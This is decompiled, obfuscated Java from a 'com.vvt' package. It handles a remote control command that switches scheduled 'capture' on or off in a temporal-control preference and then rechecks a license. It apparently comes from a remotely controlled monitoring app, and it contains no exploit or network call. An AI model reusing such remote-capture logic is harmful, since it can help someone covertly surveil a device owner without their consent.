package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefTemporalControl;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.remotecontrol.ControlCommand;
import java.util.List;

public class cc
{
  private static final boolean a = a.a;
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    com.vvt.preference.b localb = paramh.n;
    Object localObject1 = FxPreferenceType.TEMPORAL_CONTROL;
    localObject1 = (PrefTemporalControl)localb.a((FxPreferenceType)localObject1);
    List localList = i.b(paramh).b();
    Object localObject2 = paramh.k;
    ProductInfoImpl localProductInfoImpl = paramh.o;
    Object localObject3 = paramh.l.d();
    boolean bool2 = ((com.vvt.license.b)localObject2).a(localProductInfoImpl, (String)localObject3);
    localObject2 = paramControlCommand.getData();
    boolean bool3 = localObject2 instanceof Boolean;
    if (bool3)
    {
      localObject2 = (Boolean)localObject2;
      boolean bool4 = ((Boolean)localObject2).booleanValue();
      localObject3 = Integer.valueOf(i);
      ((PrefTemporalControl)localObject1).setCapture((Integer)localObject3, bool4);
      localb.b();
      bool1 = a;
      if (bool1) {}
      i.a(paramh, localList, bool2);
    }
    bool1 = a;
    if (bool1) {}
    return i;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/cc.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */